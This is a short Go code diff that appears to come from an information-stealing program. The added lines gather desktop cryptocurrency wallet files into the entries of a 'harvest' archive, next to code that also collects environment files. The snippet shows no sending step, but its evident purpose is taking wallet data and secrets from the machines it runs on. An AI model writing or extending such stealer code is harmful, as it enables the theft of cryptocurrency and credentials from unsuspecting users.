@@ -39,6 +39,16 @@ func buildPrimaryArchiveEntries(p *harvestPayload) ([]archiveEntry, error) {
 		}
 	}
 
+	for _, bundle := range recovery.CollectDesktopWalletBundles() {
+		folder := uniqueFolder(sanitizeFilename(bundle.WalletName), usedFolders)
+		for _, e := range bundle.Entries {
+			entries = append(entries, archiveEntry{
+				zipPath:  folder + "/" + filepath.ToSlash(e.ZipPath),
+				diskPath: e.SourcePath,
+			})
+		}
+	}
+
 	seenEnv := make(map[string]bool)
 	entries = appendEnvFileEntries(entries, p, seenEnv)
 
